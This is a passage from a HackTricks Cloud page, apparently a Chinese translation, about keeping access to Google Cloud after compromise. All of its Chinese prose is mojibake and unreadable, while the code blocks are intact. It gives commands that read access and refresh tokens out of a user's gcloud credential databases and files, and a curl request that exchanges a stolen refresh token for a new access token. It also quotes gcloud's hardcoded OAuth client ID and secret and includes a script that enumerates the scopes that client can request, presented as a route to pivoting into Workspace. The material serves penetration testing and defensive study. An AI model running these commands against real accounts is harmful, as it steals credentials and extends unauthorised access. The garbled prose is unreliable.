# GCP - éæœåŠ¡æŒä¹…æ€§

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

- å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
- è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
- æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
- **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã€‚**
- é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

è¿™äº›æŠ€æœ¯åœ¨æŸç§æ–¹å¼ä¸‹ï¼Œä¸€æ—¦æ‚¨å·²ç»è·å–äº†ä¸€äº›GCPå‡­æ®æˆ–åœ¨GCPç¯å¢ƒä¸­è¿è¡Œçš„æœºå™¨ï¼Œå°±ä¼šå˜å¾—éå¸¸æœ‰ç”¨ã€‚

## ä»¤ç‰ŒåŠ«æŒ

### å·²è®¤è¯ç”¨æˆ·ä»¤ç‰Œ

è¦è·å–ç”¨æˆ·çš„**å½“å‰ä»¤ç‰Œ**ï¼Œæ‚¨å¯ä»¥è¿è¡Œï¼š
```bash
sqlite3 $HOME/.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
{% endcode %}

åœ¨æ­¤é¡µé¢ä¸­æŸ¥çœ‹å¦‚ä½•**ç›´æ¥ä½¿ç”¨gcloudä½¿ç”¨æ­¤ä»¤ç‰Œ**ï¼š

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#id-6440-1" %}

è¦è·å–**ç”Ÿæˆæ–°è®¿é—®ä»¤ç‰Œçš„è¯¦ç»†ä¿¡æ¯**ï¼Œè¯·è¿è¡Œï¼š

{% code overflow="wrap" %}
```bash
sqlite3 $HOME/.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
{% endcode %}

è¿˜å¯ä»¥åœ¨ **`$HOME/.config/gcloud/application_default_credentials.json`** å’Œ **`$HOME/.config/gcloud/legacy_credentials/*/adc.json`** ä¸­æ‰¾åˆ°åˆ·æ–°ä»¤ç‰Œã€‚

è¦ä½¿ç”¨**åˆ·æ–°ä»¤ç‰Œ**ã€å®¢æˆ·ç«¯IDå’Œå®¢æˆ·ç«¯å¯†é’¥è·å–æ–°çš„åˆ·æ–°åè®¿é—®ä»¤ç‰Œï¼Œè¯·è¿è¡Œï¼š 

{% code overflow="wrap" %}
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
{% endcode %}

åˆ·æ–°ä»¤ç‰Œçš„æœ‰æ•ˆæ€§å¯ä»¥åœ¨**ç®¡ç†** > **å®‰å…¨æ€§** > **Google Cloud ä¼šè¯æ§åˆ¶**ä¸­è¿›è¡Œç®¡ç†ï¼Œé»˜è®¤è®¾ç½®ä¸º16å°æ—¶ï¼Œå°½ç®¡å¯ä»¥è®¾ç½®ä¸ºæ°¸ä¸è¿‡æœŸï¼š

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

### è®¤è¯æµç¨‹

å½“ä½¿ç”¨ç±»ä¼¼`gcloud auth login`çš„å·¥å…·æ—¶ï¼Œè®¤è¯æµç¨‹ä¼šåœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ä¸€ä¸ªæç¤ºï¼Œæ¥å—æ‰€æœ‰èŒƒå›´åï¼Œæµè§ˆå™¨å°†å‘é€ç±»ä¼¼ä»¥ä¸‹è¯·æ±‚åˆ°å·¥å…·æ‰“å¼€çš„httpç«¯å£ï¼š
```
/?state=EN5AK1GxwrEKgKog9ANBm0qDwWByYO&code=4/0AeaYSHCllDzZCAt2IlNWjMHqr4XKOuNuhOL-TM541gv-F6WOUsbwXiUgMYvo4Fg0NGzV9A&scope=email%20openid%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/cloud-platform%20https://www.googleapis.com/auth/appengine.admin%20https://www.googleapis.com/auth/sqlservice.login%20https://www.googleapis.com/auth/compute%20https://www.googleapis.com/auth/accounts.reauth&authuser=0&prompt=consent HTTP/1.1
```
ç„¶åï¼Œgcloudå°†ä½¿ç”¨ä¸€äº›ç¡¬ç¼–ç çš„`client_id`ï¼ˆ`32555940559.apps.googleusercontent.com`ï¼‰å’Œ`client_secret`ï¼ˆ`ZmssLNjJy2998hD4CTg2ejr2`ï¼‰ä¸çŠ¶æ€å’Œä»£ç ä¸€èµ·è·å–æœ€ç»ˆçš„åˆ·æ–°ä»¤ç‰Œæ•°æ®ã€‚

{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œä¸æœ¬åœ°ä¸»æœºçš„é€šä¿¡æ˜¯é€šè¿‡HTTPè¿›è¡Œçš„ï¼Œå› æ­¤æœ‰å¯èƒ½æ‹¦æˆªæ•°æ®ä»¥è·å–åˆ·æ–°ä»¤ç‰Œï¼Œä½†æ˜¯è¿™äº›æ•°æ®ä»…æœ‰æ•ˆä¸€æ¬¡ï¼Œå› æ­¤è¿™æ ·åšæ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼Œæ›´å®¹æ˜“çš„æ–¹æ³•æ˜¯ç›´æ¥ä»æ–‡ä»¶ä¸­è¯»å–åˆ·æ–°ä»¤ç‰Œã€‚
{% endhint %}

### OAuthèŒƒå›´

æ‚¨å¯ä»¥åœ¨[https://developers.google.com/identity/protocols/oauth2/scopes](https://developers.google.com/identity/protocols/oauth2/scopes)æ‰¾åˆ°æ‰€æœ‰GoogleèŒƒå›´ï¼Œæˆ–è€…æ‰§è¡Œä»¥ä¸‹æ“ä½œè·å–å®ƒä»¬ï¼š

{% code overflow="wrap" %}
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-A/\-\._]*' | sort -u
```
{% endcode %}

å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è„šæœ¬æŸ¥çœ‹ **`gcloud`** ç”¨äºè®¤è¯çš„åº”ç”¨ç¨‹åºå¯ä»¥æ”¯æŒå“ªäº›èŒƒå›´ï¼š
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope         \r"
if ! curl -v "https://accounts.google.com/o/oauth2/auth?response_type=code&client_id=32555940559.apps.googleusercontent.com&redirect_uri=http%3A%2F%2Flocalhost%3A8085%2F&scope=openid+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcloud-platform+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fappengine.admin+$scope+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fsqlservice.login+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcompute+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Faccounts.reauth&state=AjvFqBW5XNIw3VADagy5pvUSPraLQu&access_type=offline&code_challenge=IOk5F08WLn5xYPGRAHP9CTGHbLFDUElsP551ni2leN4&code_challenge_method=S256" 2>&1 | grep -q "error"; then
echo ""
echo $scope
fi
done
```
æ‰§è¡Œåï¼Œæ£€æŸ¥åˆ°è¯¥åº”ç”¨ç¨‹åºæ”¯æŒä»¥ä¸‹èŒƒå›´ï¼š
```
https://www.googleapis.com/auth/appengine.admin
https://www.googleapis.com/auth/bigquery
https://www.googleapis.com/auth/cloud-platform
https://www.googleapis.com/auth/compute
https://www.googleapis.com/auth/devstorage.full_control
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/userinfo.email
```
è¿™ä¸ªåº”ç”¨æ”¯æŒ**`drive`**èŒƒå›´ï¼Œå¦‚æœæ”»å‡»è€…æˆåŠŸå¼ºåˆ¶ç”¨æˆ·ç”Ÿæˆå…·æœ‰æ­¤èŒƒå›´çš„ä»¤ç‰Œï¼Œå°±å¯ä»¥ä»GCPå‡çº§åˆ°Workspaceã€‚

**æŸ¥çœ‹å¦‚ä½•** [**æ»¥ç”¨æ­¤åŠŸèƒ½**](../gcp-to-workspace-pivoting/#abusing-gcloud)**ã€‚**

### æœåŠ¡è´¦å·

å°±åƒå¯¹å¾…ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ä¸€æ ·ï¼Œå¦‚æœä½ æˆåŠŸ**çªƒå–äº†æœåŠ¡è´¦å·çš„ç§é’¥æ–‡ä»¶**ï¼Œä½ å°†èƒ½å¤Ÿ**éšæ„è®¿é—®å®ƒ**ã€‚\
ç„¶è€Œï¼Œå¦‚æœä½ çªƒå–äº†æœåŠ¡è´¦å·çš„**OAuthä»¤ç‰Œ**ï¼Œè¿™å¯èƒ½æ›´æœ‰è¶£ï¼Œå› ä¸ºå³ä½¿é»˜è®¤æƒ…å†µä¸‹è¿™äº›ä»¤ç‰Œåªæœ‰ä¸€ä¸ªå°æ—¶çš„æœ‰æ•ˆæœŸï¼Œå¦‚æœ**å—å®³è€…åˆ é™¤äº†ç§æœ‰APIå¯†é’¥ï¼ŒOAuthä»¤ç‰Œä»å°†æœ‰æ•ˆç›´åˆ°è¿‡æœŸ**ã€‚

### å…ƒæ•°æ®

æ˜¾ç„¶ï¼Œåªè¦ä½ åœ¨è¿è¡Œåœ¨GCPç¯å¢ƒä¸­çš„æœºå™¨å†…éƒ¨ï¼Œä½ å°†èƒ½å¤Ÿé€šè¿‡è”ç³»å…ƒæ•°æ®ç«¯ç‚¹**è®¿é—®é™„åŠ åˆ°è¯¥æœºå™¨çš„æœåŠ¡è´¦å·**ï¼ˆè¯·æ³¨æ„ï¼Œåœ¨æ­¤ç«¯ç‚¹ä¸­å¯ä»¥è®¿é—®çš„OAuthä»¤ç‰Œé€šå¸¸å—åˆ°èŒƒå›´çš„é™åˆ¶ï¼‰ã€‚

### ä¿®å¤æªæ–½

è¿™äº›æŠ€æœ¯çš„ä¸€äº›ä¿®å¤æªæ–½åœ¨[https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)ä¸­æœ‰è§£é‡Šã€‚

## å‚è€ƒèµ„æ–™

* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³çœ‹åˆ°ä½ çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥**åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
